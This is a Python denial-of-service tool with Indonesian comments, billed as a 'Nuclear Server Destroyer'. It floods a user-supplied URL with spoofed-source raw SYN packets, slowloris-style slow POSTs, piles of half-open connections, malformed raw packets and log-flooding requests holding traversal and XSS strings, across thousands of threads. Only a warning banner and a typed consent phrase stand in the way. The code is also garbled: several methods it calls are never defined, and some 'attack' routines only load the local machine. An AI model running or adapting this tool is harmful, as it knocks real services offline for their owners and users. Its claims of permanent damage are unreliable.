import requests
import time
import socket
import ssl
from urllib.parse import urlparse
import concurrent.futures
import sys
import os
import random
import json
import hashlib
from colorama import init, Fore, Style
import threading
import urllib3
import base64
from fake_useragent import UserAgent
import struct
import ipaddress
import asyncio
import aiohttp
import select
import http.client
import urllib.request

# ==============================================
# KONFIGURASI AWAL
# ==============================================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

# ==============================================
# KELAS UTAMA - NUCLEAR DESTROYER
# ==============================================
class NuclearServerDestroyer:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.parsed_url = urlparse(self.url)
        self.hostname = self.parsed_url.hostname
        self.ip = self.resolve_dns(self.hostname)
        self.port = self.parsed_url.port or (443 if self.parsed_url.scheme == 'https' else 80)
        self.is_https = self.parsed_url.scheme == 'https'
        
        # Statistik REAL-TIME
        self.stats = {
            'total_requests': 0,
            'success': 0,
            'failed': 0,
            'bytes_sent': 0,
            'connections': 0,
            'start_time': 0,
            'current_rps': 0
        }
        
        # Status attack
        self.nuclear_mode = False
        self.brutal_mode = False
        self.attack_threads = []
        self.zombie_connections = []  # Koneksi zombie yang tetap hidup
        self.death_sockets = []       # Socket untuk killshot
        
        # Tools
        self.ua = UserAgent()
        self.cookies = {}
        self.cf_tokens = {}
        
        # Performance boosters
        self.session_pool = []
        self.max_threads = 5000       # MAKSIMAL THREADS!
        
        print(f"{Fore.RED}[⚡] NUCLEAR DESTROYER INITIALIZED")
        print(f"{Fore.CYAN}[*] Target: {self.url}")
        print(f"{Fore.CYAN}[*] IP: {self.ip}")
        print(f"{Fore.CYAN}[*] Port: {self.port}")
        print(f"{Fore.CYAN}[*] HTTPS: {self.is_https}")
    
    def resolve_dns(self, hostname):
        """Resolve DNS dengan multiple attempts"""
        try:
            return socket.gethostbyname(hostname)
        except:
            # Coba resolver alternatif
            try:
                import dns.resolver
                resolver = dns.resolver.Resolver()
                answer = resolver.resolve(hostname, 'A')
                return str(answer[0])
            except:
                return hostname
    
    # ==============================================
    # MENU UTAMA - MODE KEJAM
    # ==============================================
    def launch_nuclear_attack(self):
        """LAUNCH NUCLEAR ATTACK - MODE PALING KEJAM"""
        self.show_nuclear_banner()
        
        # PERINGATAN EKSTREM
        print(f"{Fore.RED}{'='*80}")
        print(f"{Fore.RED}[💀] WARNING: NUCLEAR MODE AKAN MENGHANCURKAN SERVER!")
        print(f"{Fore.RED}[💀] Server akan DOWN, CRASH, dan TIDAK BISA DIAKSES!")
        print(f"{Fore.RED}[💀] DAMAGE PERMANEN MUNGKIN TERJADI!")
        print(f"{Fore.RED}{'='*80}\n")
        
        # Konfirmasi FINAL
        confirm = input(f"{Fore.RED}[?] Type 'NUKE NOW' untuk konfirmasi penghancuran: ")
        if confirm != 'NUKE NOW':
            print(f"{Fore.YELLOW}[!] Nuclear launch cancelled")
            return
        
        # Pilih senjata nuklir
        print(f"\n{Fore.CYAN}[*] Select NUCLEAR WEAPON:")
        print(f"    {Fore.RED}1. ATOMIC BOMB - Instant server destruction")
        print(f"    {Fore.YELLOW}2. HYDROGEN BOMB - Maximum resource drain")
        print(f"    {Fore.GREEN}3. NEUTRON BOMB - Kill processes only")
        print(f"    {Fore.MAGENTA}4. DIRTY BOMB - Contaminate server permanently")
        
        weapon = input(f"{Fore.YELLOW}[?] Select weapon (1-4): ").strip() or "1"
        
        # Duration
        duration = 60  # Default 60 seconds of hell
        try:
            dur_input = input(f"{Fore.YELLOW}[?] Attack duration (10-300 seconds, default 60): ").strip()
            if dur_input:
                duration = int(dur_input)
                duration = max(10, min(300, duration))
        except:
            pass
        
        # Threads - UNLIMITED POWER
        threads = 5000  # MAXIMUM THREADS
        try:
            thr_input = input(f"{Fore.YELLOW}[?] Attack threads (100-10000, default 5000): ").strip()
            if thr_input:
                threads = int(thr_input)
                threads = max(100, min(10000, threads))
        except:
            pass
        
        print(f"\n{Fore.RED}[💣] NUCLEAR LAUNCH SEQUENCE INITIATED!")
        print(f"{Fore.RED}[💣] Target: {self.url}")
        print(f"{Fore.RED}[💣] Duration: {duration}s")
        print(f"{Fore.RED}[💣] Threads: {threads}")
        print(f"{Fore.RED}[💣] Weapon: {'ATOMIC' if weapon == '1' else 'HYDROGEN' if weapon == '2' else 'NEUTRON' if weapon == '3' else 'DIRTY'}")
        
        # Countdown
        for i in range(5, 0, -1):
            print(f"{Fore.RED}[!] LAUNCH IN {i}...")
            time.sleep(1)
        
        print(f"\n{Fore.RED}{'='*80}")
        print(f"{Fore.RED}[💥] NUCLEAR LAUNCH DETECTED! SERVER DESTRUCTION IMMINENT!")
        print(f"{Fore.RED}{'='*80}")
        
        # Start nuclear attack
        self.nuclear_mode = True
        self.stats['start_time'] = time.time()
        
        # Jalankan berdasarkan senjata
        if weapon == '1':
            self.atomic_bomb(duration, threads)
        elif weapon == '2':
            self.hydrogen_bomb(duration, threads)
        elif weapon == '3':
            self.neutron_bomb(duration, threads)
        else:
            self.dirty_bomb(duration, threads)
        
        # Tampilkan hasil
        self.show_nuclear_results()
        
        # Cleanup
        self.cleanup_nuclear()
    
    # ==============================================
    # SENJATA NUKLIR
    # ==============================================
    def atomic_bomb(self, duration, threads):
        """ATOMIC BOMB - Instant server destruction"""
        print(f"{Fore.RED}[💣] ATOMIC BOMB DETONATED!")
        
        # Phase 1: Initial blast
        print(f"{Fore.YELLOW}[*] Phase 1: Initial blast wave...")
        self.mass_syn_tsunami(threads // 2)
        
        # Phase 2: Heat wave
        print(f"{Fore.YELLOW}[*] Phase 2: Heat wave (resource exhaustion)...")
        self.resource_inferno(threads // 4)
        
        # Phase 3: Radiation
        print(f"{Fore.YELLOW}[*] Phase 3: Radiation (persistent damage)...")
        self.persistent_radiation(duration)
        
        # Monitor
        self.nuclear_monitor(duration)
    
    def hydrogen_bomb(self, duration, threads):
        """HYDROGEN BOMB - Maximum resource drain"""
        print(f"{Fore.RED}[💣] HYDROGEN BOMB DETONATED!")
        
        # Multi-stage fusion reaction
        stages = [
            ("Deuterium compression", self.cpu_meltdown),
            ("Tritium fusion", self.memory_blackhole),
            ("Lithium blanket", self.disk_apocalypse),
            ("Final fusion", self.network_armageddon)
        ]
        
        for stage_name, stage_func in stages:
            print(f"{Fore.YELLOW}[*] Stage: {stage_name}...")
            stage_threads = threads // len(stages)
            
            # Jalankan stage
            for i in range(stage_threads):
                t = threading.Thread(target=stage_func)
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
            
            time.sleep(duration // len(stages))
        
        self.nuclear_monitor(duration)
    
    def neutron_bomb(self, duration, threads):
        """NEUTRON BOMB - Kill processes only"""
        print(f"{Fore.RED}[💣] NEUTRON BOMB DETONATED!")
        
        # Target: Processes and connections only
        self.brutal_mode = True
        
        # Neutron radiation techniques
        techniques = [
            self.connection_neutron_beam,
            self.process_killshot,
            self.session_annihilator,
            self.thread_massacre
        ]
        
        # Jalankan semua teknik neutron
        for i, technique in enumerate(techniques):
            tech_threads = threads // len(techniques)
            
            for j in range(tech_threads):
                t = threading.Thread(target=self.neutron_worker, args=(technique, duration))
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
            
            print(f"{Fore.YELLOW}[*] Neutron beam {i+1}/{len(techniques)} activated")
        
        self.nuclear_monitor(duration)
    
    def dirty_bomb(self, duration, threads):
        """DIRTY BOMB - Contaminate server permanently"""
        print(f"{Fore.RED}[💣] DIRTY BOMB DETONATED!")
        print(f"{Fore.RED}[!] Server will be contaminated with garbage data")
        
        # Contamination techniques
        contaminants = [
            self.log_file_contamination,
            self.database_pollution,
            self.cache_poisoning,
            self.config_corruption
        ]
        
        # Spread contamination
        for contaminate in contaminants:
            for i in range(threads // len(contaminants)):
                t = threading.Thread(target=contaminate)
                t.daemon = True
                t.start()
                self.attack_threads.append(t)
            
            print(f"{Fore.YELLOW}[*] Spreading {contaminate.__name__}...")
            time.sleep(5)
        
        # Monitor
        self.nuclear_monitor(duration)
    
    # ==============================================
    # TEKNIK PENGHANCURAN NUKLIR
    # ==============================================
    def mass_syn_tsunami(self, threads):
        """SYN Tsunami - Thousands of SYN packets"""
        print(f"{Fore.RED}[*] Launching SYN TSUNAMI...")
        
        def syn_tsunami_worker():
            while self.nuclear_mode:
                try:
                    # Raw socket untuk SYN flood
                    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    
                    # Kirim ribuan SYN packets
                    for _ in range(100):  # 100 packets per burst
                        src_port = random.randint(1024, 65535)
                        packet = self.create_syn_packet(src_port, self.port)
                        
                        try:
                            sock.sendto(packet, (self.ip, 0))
                            self.stats['bytes_sent'] += len(packet)
                            self.stats['total_requests'] += 1
                        except:
                            pass
                    
                    sock.close()
                    
                except:
                    # Fallback ke normal TCP
                    self.tcp_armageddon()
                
                time.sleep(0.01)
        
        # Launch tsunami
        for i in range(min(threads, 1000)):
            t = threading.Thread(target=syn_tsunami_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
    
    def create_syn_packet(self, src_port, dst_port):
        """Create malicious SYN packet"""
        # IP Header
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               69, 0, 40, random.randint(1, 65535),
                               0, 255, 6, 0,
                               socket.inet_aton(self.generate_fake_ip()),
                               socket.inet_aton(self.ip))
        
        # TCP Header dengan SYN flag
        tcp_header = struct.pack('!HHLLBBHHH',
                               src_port, dst_port,
                               random.randint(0, 4294967295), 0,
                               5 << 4, 2,  # SYN flag
                               5840, 0, 0)
        
        return ip_header + tcp_header
    
    def generate_fake_ip(self):
        """Generate fake IP untuk spoofing"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def tcp_armageddon(self):
        """TCP Armageddon - Complete connection chaos"""
        try:
            # Buat banyak koneksi sekaligus
            sockets = []
            
            for _ in range(50):  # 50 connections per burst
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    
                    # Connect
                    sock.connect((self.ip, self.port))
                    
                    # SSL jika perlu
                    if self.is_https:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=self.hostname)
                    
                    # Kirim garbage data
                    garbage = os.urandom(random.randint(512, 4096))
                    sock.send(garbage)
                    
                    # Simpan sebagai zombie
                    self.zombie_connections.append(sock)
                    sockets.append(sock)
                    
                    self.stats['connections'] += 1
                    self.stats['bytes_sent'] += len(garbage)
                    
                except:
                    continue
            
            # Kirim data ke zombie connections
            for sock in sockets:
                try:
                    for _ in range(10):
                        sock.send(os.urandom(1024))
                        time.sleep(0.1)
                except:
                    pass
            
            return len(sockets) > 0
            
        except:
            return False
    
    def resource_inferno(self, threads):
        """Resource Inferno - Burn all server resources"""
        print(f"{Fore.RED}[*] Igniting RESOURCE INFERNO...")
        
        def inferno_worker():
            while self.nuclear_mode:
                # CPU burning
                self.cpu_napalm()
                
                # Memory destruction
                self.memory_holocaust()
                
                # Disk thrashing
                self.disk_annihilation()
                
                time.sleep(0.1)
        
        # Start inferno
        for i in range(min(threads, 500)):
            t = threading.Thread(target=inferno_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
    
    def cpu_napalm(self):
        """CPU Napalm - Burn CPU with complex calculations"""
        try:
            # Complex mathematical operations
            for _ in range(1000):
                # Fibonacci-like calculation
                a, b = 0, 1
                for _ in range(1000):
                    a, b = b, a + b
                
                # Prime number calculation
                n = random.randint(10000, 100000)
                primes = []
                for num in range(2, n):
                    for i in range(2, int(num**0.5) + 1):
                        if num % i == 0:
                            break
                    else:
                        primes.append(num)
            
            self.stats['total_requests'] += 1
            self.stats['success'] += 1
            return True
            
        except:
            self.stats['failed'] += 1
            return False
    
    def memory_holocaust(self):
        """Memory Holocaust - Consume all memory"""
        try:
            # Allocate massive amounts of memory
            memory_blocks = []
            
            for _ in range(100):  # 100 MB blocks
                try:
                    # Allocate 1MB of memory
                    block = 'X' * (1024 * 1024)
                    memory_blocks.append(block)
                    
                    # Force Python to keep it
                    if len(memory_blocks) > 50:
                        memory_blocks.pop(0)
                    
                except MemoryError:
                    break
            
            self.stats['total_requests'] += 1
            self.stats['success'] += 1
            return True
            
        except:
            self.stats['failed'] += 1
            return False
    
    def disk_annihilation(self):
        """Disk Annihilation - Thrash disk I/O"""
        try:
            # Create and delete temporary files
            temp_files = []
            
            for i in range(100):
                try:
                    # Create temp file with random data
                    temp_file = f"/tmp/nuke_{hashlib.md5(str(time.time()).encode()).hexdigest()[:10]}.tmp"
                    with open(temp_file, 'wb') as f:
                        f.write(os.urandom(1024 * 1024))  # 1MB file
                    
                    temp_files.append(temp_file)
                    
                    # Read and delete
                    with open(temp_file, 'rb') as f:
                        _ = f.read()
                    
                    os.unlink(temp_file)
                    temp_files.remove(temp_file)
                    
                except:
                    continue
            
            self.stats['total_requests'] += 1
            self.stats['success'] += 1
            return True
            
        except:
            self.stats['failed'] += 1
            return False
    
    def persistent_radiation(self, duration):
        """Persistent Radiation - Keep server damaged"""
        print(f"{Fore.RED}[*] Emitting PERSISTENT RADIATION...")
        
        def radiation_worker():
            start_time = time.time()
            
            while self.nuclear_mode and (time.time() - start_time) < duration:
                # Slowloris extreme
                self.slowloris_doomsday()
                
                # Keep connections alive
                self.zombie_apocalypse()
                
                # Send malformed packets
                self.packet_mutation()
                
                time.sleep(0.5)
        
        # Start radiation
        for i in range(100):
            t = threading.Thread(target=radiation_worker)
            t.daemon = True
            t.start()
            self.attack_threads.append(t)
    
    def slowloris_doomsday(self):
        """Slowloris Doomsday - Ultimate slow attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            # Connect
            sock.connect((self.ip, self.port))
            
            if self.is_https:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.hostname)
            
            # Send never-ending request
            request = f"POST / HTTP/1.1\r\n"
            request += f"Host: {self.hostname}\r\n"
            request += "User-Agent: {}\r\n".format(self.ua.random)
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += f"Content-Length: {random.randint(10000000, 50000000)}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            # Send data 1 byte at a time
            bytes_sent = 0
            while bytes_sent < 1000 and self.nuclear_mode:  # Send 1000 bytes extremely slow
                sock.send(b'X')
                bytes_sent += 1
                time.sleep(random.uniform(5, 15))  # 5-15 seconds per byte!
            
            # Keep socket
            self.death_sockets.append(sock)
            
            return True
            
        except:
            return False
    
    def zombie_apocalypse(self):
        """Zombie Apocalypse - Keep dead connections alive"""
        # Reanimate zombie connections
        for sock in self.zombie_connections[:100]:  # First 100 zombies
            try:
                # Send heartbeat
                sock.send(b'ZOMBIE\n')
                time.sleep(0.01)
            except:
                # Remove dead zombie
                try:
                    sock.close()
                    self.zombie_connections.remove(sock)
                except:
                    pass
    
    def packet_mutation(self):
        """Packet Mutation - Send malformed packets"""
        try:
            # Raw socket untuk malformed packets
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            
            # Create malformed packet
            malformed = os.urandom(random.randint(100, 1500))
            
            # Send to various ports
            for port in [80, 443, 8080, 8443]:
                try:
                    sock.sendto(malformed, (self.ip, port))
                    self.stats['bytes_sent'] += len(malformed)
                except:
                    pass
            
            sock.close()
            return True
            
        except:
            return False
    
    def connection_neutron_beam(self):
        """Connection Neutron Beam - Destroy specific connections"""
        try:
            # Create many half-open connections
            sockets = []
            
            for _ in range(10):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                
                try:
                    sock.connect((self.ip, self.port))
                    
                    # Send SYN but never complete
                    if random.random() > 0.5:
                        sock.send(b'GET / HTTP/1.0\r\n')
                    
                    sockets.append(sock)
                    self.stats['connections'] += 1
                    
                except:
                    continue
            
            # Don't close them - leave them hanging
            self.death_sockets.extend(sockets)
            
            return True
            
        except:
            return False
    
    def process_killshot(self):
        """Process Killshot - Target specific processes"""
        # HTTP requests designed to trigger process creation
        endpoints = [
            '/wp-admin/admin-ajax.php',
            '/api/v1/process',
            '/cgi-bin/test.cgi',
            '/admin/exec.php',
            '/backend/processor'
        ]
        
        try:
            headers = {
                'User-Agent': self.ua.random,
                'Accept': '*/*',
                'Connection': 'keep-alive',
            }
            
            # Trigger process creation
            for endpoint in random.sample(endpoints, 3):
                try:
                    url = f"{self.url.rstrip('/')}{endpoint}"
                    
                    # POST data that might trigger processing
                    data = {
                        'action': 'process',
                        'data': base64.b64encode(os.urandom(10000)).decode(),
                        'cmd': 'calculate' if random.random() > 0.5 else 'compress'
                    }
                    
                    response = requests.post(
                        url,
                        headers=headers,
                        data=data,
                        timeout=3,
                        verify=False
                    )
                    
                    self.stats['total_requests'] += 1
                    if response.status_code < 500:
                        self.stats['success'] += 1
                    else:
                        self.stats['failed'] += 1
                    
                except:
                    self.stats['failed'] += 1
            
            return True
            
        except:
            return False
    
    def log_file_contamination(self):
        """Log File Contamination - Fill logs with garbage"""
        try:
            # Requests designed to generate log entries
            log_triggers = [
                ('/nonexistent', 404),
                ('/admin', 403),
                ('/../etc/passwd', 400),
                ('/<script>alert(1)</script>', 400)
            ]
            
            for path, expected_code in log_triggers:
                try:
                    headers = {'User-Agent': f'Contaminator/{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}'}
                    
                    response = requests.get(
                        f"{self.url.rstrip('/')}{path}",
                        headers=headers,
                        timeout=2,
                        verify=False
                    )
                    
                    # Even if we get expected code, it still generates logs
                    self.stats['total_requests'] += 1
                    self.stats['success'] += 1
                    
                except:
                    self.stats['failed'] += 1
            
            return True
            
        except:
            return False
    
    # ==============================================
    # MONITORING & RESULTS
    # ==============================================
    def nuclear_monitor(self, duration):
        """Nuclear Attack Monitor"""
        print(f"\n{Fore.RED}[*] NUCLEAR ATTACK IN PROGRESS...")
        
        start_time = time.time()
        last_stats = self.stats.copy()
        
        while self.nuclear_mode and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            progress = (elapsed / duration) * 100
            
            # Calculate RPS
            time_diff = 1
            current_rps = (self.stats['total_requests'] - last_stats['total_requests']) / time_diff
            self.stats['current_rps'] = current_rps
            
            # Visual destruction meter
            destruction = min(100, (current_rps / 1000) * 100)
            
            # Display
            bar_length = 50
            filled = int(bar_length * (progress / 100))
            destruction_filled = int(bar_length * (destruction / 100))
            
            progress_bar = '█' * filled + '░' * (bar_length - filled)
            destruction_bar = '💀' * destruction_filled + ' ' * (bar_length - destruction_filled)
            
            print(f"\r{Fore.RED}[{progress_bar}] {progress:.1f}% "
                  f"{Fore.YELLOW}| RPS: {current_rps:.0f} "
                  f"{Fore.CYAN}| Req: {self.stats['total_requests']:,} "
                  f"{Fore.GREEN}| OK: {self.stats['success']:,} "
                  f"{Fore.RED}| BAD: {self.stats['failed']:,} "
                  f"{Fore.MAGENTA}| Con: {self.stats['connections']:,}", end='')
            
            if destruction > 80:
                print(f" {Fore.RED}[DESTRUCTION: {destruction:.0f}%]", end='')
            
            # Update last stats
            last_stats = self.stats.copy()
            time.sleep(1)
        
        print()
    
    def show_nuclear_results(self):
        """Show Nuclear Attack Results"""
        total_time = time.time() - self.stats['start_time']
        
        print(f"\n{Fore.RED}{'='*80}")
        print(f"{Fore.RED}💀 NUCLEAR ATTACK COMPLETE - DAMAGE ASSESSMENT")
        print(f"{Fore.RED}{'='*80}")
        
        print(f"{Fore.CYAN}[*] Attack Duration: {total_time:.1f}s")
        print(f"{Fore.CYAN}[*] Total Requests: {self.stats['total_requests']:,}")
        
        if total_time > 0:
            avg_rps = self.stats['total_requests'] / total_time
            print(f"{Fore.CYAN}[*] Average RPS: {avg_rps:.1f}")
        else:
            avg_rps = 0
        
        print(f"{Fore.CYAN}[*] Successful: {self.stats['success']:,}")
        print(f"{Fore.CYAN}[*] Failed: {self.stats['failed']:,}")
        print(f"{Fore.CYAN}[*] Bytes Sent: {self.stats['bytes_sent']:,}")
        print(f"{Fore.CYAN}[*] Connections Made: {self.stats['connections']:,}")
        
        # Damage Assessment
        if avg_rps > 10000:
            damage = "💀 CATASTROPHIC"
            desc = "Server is completely destroyed"
            color = Fore.RED
        elif avg_rps > 5000:
            damage = "🔥 SEVERE"
            desc = "Server is heavily damaged and unstable"
            color = Fore.RED
        elif avg_rps > 2000:
            damage = "⚠️ CRITICAL"
            desc = "Server is critically damaged"
            color = Fore.YELLOW
        elif avg_rps > 1000:
            damage = "⚠️ HEAVY"
            desc = "Server is significantly damaged"
            color = Fore.YELLOW
        elif avg_rps > 500:
            damage = "⚠️ MODERATE"
            desc = "Server is damaged but functional"
            color = Fore.GREEN
        else:
            damage = "✅ MINIMAL"
            desc = "Server survived the attack"
            color = Fore.CYAN
        
        print(f"\n{color}[*] DAMAGE LEVEL: {damage}")
        print(f"{color}[*] {desc}")
        
        # Test server status
        self.test_server_aftermath()
    
    def test_server_aftermath(self):
        """Test server after nuclear attack"""
        print(f"\n{Fore.CYAN}[*] Testing server status...")
        
        tests = [
            ("HTTP Connection", self.test_http),
            ("Response Time", self.test_response_time),
            ("Error Rate", self.test_error_rate),
            ("Resource Usage", self.test_resource_usage)
        ]
        
        for test_name, test_func in tests:
            try:
                result = test_func()
                print(f"{Fore.GREEN}[✓] {test_name}: {result}")
            except Exception as e:
                print(f"{Fore.RED}[✗] {test_name}: FAILED - {str(e)}")
    
    def test_http(self):
        """Test HTTP connectivity"""
        try:
            start = time.time()
            response = requests.get(self.url, timeout=5, verify=False)
            response_time = time.time() - start
            
            if response.status_code >= 500:
                return f"ERROR {response.status_code} ({response_time:.2f}s)"
            elif response_time > 3:
                return f"SLOW {response.status_code} ({response_time:.2f}s)"
            else:
                return f"OK {response.status_code} ({response_time:.2f}s)"
                
        except requests.exceptions.Timeout:
            return "TIMEOUT"
        except requests.exceptions.ConnectionError:
            return "NO CONNECTION"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def test_response_time(self):
        """Test response time"""
        try:
            times = []
            for _ in range(3):
                start = time.time()
                requests.get(self.url, timeout=3, verify=False)
                times.append(time.time() - start)
            
            avg_time = sum(times) / len(times)
            return f"{avg_time:.2f}s"
        except:
            return "FAILED"
    
    def test_error_rate(self):
        """Test error rate"""
        try:
            errors = 0
            total = 5
            
            for _ in range(total):
                try:
                    response = requests.get(self.url, timeout=2, verify=False)
                    if response.status_code >= 400:
                        errors += 1
                except:
                    errors += 1
            
            error_rate = (errors / total) * 100
            return f"{error_rate:.0f}%"
        except:
            return "UNKNOWN"
    
    def test_resource_usage(self):
        """Test resource usage (estimated)"""
        # Ini adalah estimasi berdasarkan RPS
        rps = self.stats['current_rps']
        
        if rps > 5000:
            return "CRITICAL (100%+)"
        elif rps > 2000:
            return "HIGH (80-100%)"
        elif rps > 1000:
            return "MEDIUM (50-80%)"
        elif rps > 500:
            return "LOW (20-50%)"
        else:
            return "NORMAL (<20%)"
    
    def cleanup_nuclear(self):
        """Cleanup after nuclear attack"""
        print(f"\n{Fore.CYAN}[*] Nuclear cleanup in progress...")
        
        # Stop all attacks
        self.nuclear_mode = False
        self.brutal_mode = False
        
        # Close all sockets
        print(f"{Fore.YELLOW}[*] Closing zombie connections...")
        for sock in self.zombie_connections:
            try:
                sock.close()
            except:
                pass
        
        for sock in self.death_sockets:
            try:
                sock.close()
            except:
                pass
        
        # Clear lists
        self.zombie_connections.clear()
        self.death_sockets.clear()
        self.attack_threads.clear()
        
        print(f"{Fore.GREEN}[✓] Nuclear cleanup complete")
    
    def show_nuclear_banner(self):
        """Show nuclear banner"""
        os.system('cls' if os.name == 'nt' else 'clear')
        
        banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  ███╗   ██╗██╗   ██╗ ██████╗██╗     ███████╗ █████╗ ██████╗         ║
║  ████╗  ██║██║   ██║██╔════╝██║     ██╔════╝██╔══██╗██╔══██╗        ║
║  ██╔██╗ ██║██║   ██║██║     ██║     █████╗  ███████║██████╔╝        ║
║  ██║╚██╗██║██║   ██║██║     ██║     ██╔══╝  ██╔══██║██╔══██╗        ║
║  ██║ ╚████║╚██████╔╝╚██████╗███████╗███████╗██║  ██║██║  ██║        ║
║  ╚═╝  ╚═══╝ ╚═════╝  ╚═════╝╚══════╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝        ║
║                                                                      ║
║                    NUCLEAR SERVER DESTROYER v7.0                    ║
║               ULTIMATE BRUTALITY - GUARANTEED DESTRUCTION            ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════╗
{Fore.YELLOW}║               ⚠️  EXTREME DANGER - NUCLEAR WEAPON ⚠️                 ║
{Fore.YELLOW}║        This tool will DESTROY servers COMPLETELY and PERMANENTLY   ║
{Fore.YELLOW}║        Use ONLY on servers you OWN or have PERMISSION to DESTROY   ║
{Fore.YELLOW}║              ILLEGAL use = CRIMINAL PROSECUTION                    ║
{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
        """
        print(banner)

# ==============================================
# MAIN PROGRAM
# ==============================================
def main():
    """Main program"""
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Display warning
    print(f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║  ███████╗██╗  ██╗████████╗██████╗ ███████╗███╗   ███╗       ║
║  ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔════╝████╗ ████║       ║
║  █████╗   ╚███╔╝    ██║   ██████╔╝█████╗  ██╔████╔██║       ║
║  ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══╝  ██║╚██╔╝██║       ║
║  ███████╗██╔╝ ██╗   ██║   ██║  ██║███████╗██║ ╚═╝ ██║       ║
║  ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝       ║
║                                                              ║
║               EXTREME SERVER DESTROYER v7.0                  ║
║                   NUCLEAR EDITION - BRUTAL                   ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    """)
    
    print(f"{Fore.RED}[!] ⚠️  EXTREME LEGAL WARNING ⚠️")
    print(f"{Fore.RED}[!] This is a NUCLEARY LEVEL server destruction tool")
    print(f"{Fore.RED}[!] It will cause PERMANENT DAMAGE to servers")
    print(f"{Fore.RED}[!] Use ONLY on servers you OWN")
    print(f"{Fore.RED}[!] Unauthorized use = CRIMINAL CHARGES\n")
    
    # Legal agreement
    print(f"{Fore.YELLOW}[!] LEGAL AGREEMENT (READ CAREFULLY):")
    print(f"{Fore.YELLOW}    1. I OWN the target server COMPLETELY")
    print(f"{Fore.YELLOW}    2. I have WRITTEN PERMISSION to DESTROY it")
    print(f"{Fore.YELLOW}    3. I accept ALL LEGAL RESPONSIBILITY")
    print(f"{Fore.YELLOW}    4. I will NOT use this for illegal purposes")
    print(f"{Fore.YELLOW}    5. I understand this causes PERMANENT DAMAGE")
    
    accept = input(f"\n{Fore.RED}[?] Type 'I ACCEPT FULL RESPONSIBILITY' to continue: ")
    if accept != 'I ACCEPT FULL RESPONSIBILITY':
        print(f"{Fore.RED}[✗] Access denied. You must accept full responsibility.")
        return
    
    # Get target
    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"{Fore.GREEN}[✓] Target from arguments: {target}")
    else:
        target = input(f"\n{Fore.YELLOW}[?] Enter target URL to DESTROY: {Fore.WHITE}").strip()
        if not target:
            print(f"{Fore.RED}[✗] Target required")
            return
    
    # Create destroyer
    destroyer = NuclearServerDestroyer(target)
    
    try:
        # Launch nuclear attack
        destroyer.launch_nuclear_attack()
        
        print(f"\n{Fore.GREEN}[✓] Nuclear mission completed")
        print(f"{Fore.YELLOW}[!] Remember: With great power comes great responsibility")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Nuclear launch aborted by user")
        destroyer.cleanup_nuclear()
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Nuclear error: {str(e)}")
        destroyer.cleanup_nuclear()

# ==============================================
# EXECUTION
# ==============================================
if __name__ == "__main__":
    # Check requirements
    try:
        import requests
        import colorama
        from fake_useragent import UserAgent
    except ImportError:
        print(f"{Fore.RED}[✗] Missing packages. Install with:")
        print(f"{Fore.YELLOW}pip install requests colorama fake-useragent")
        sys.exit(1)
    
    # Run main
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Program terminated")
    except Exception as e:
        print(f"\n{Fore.RED}[✗] Fatal error: {str(e)}")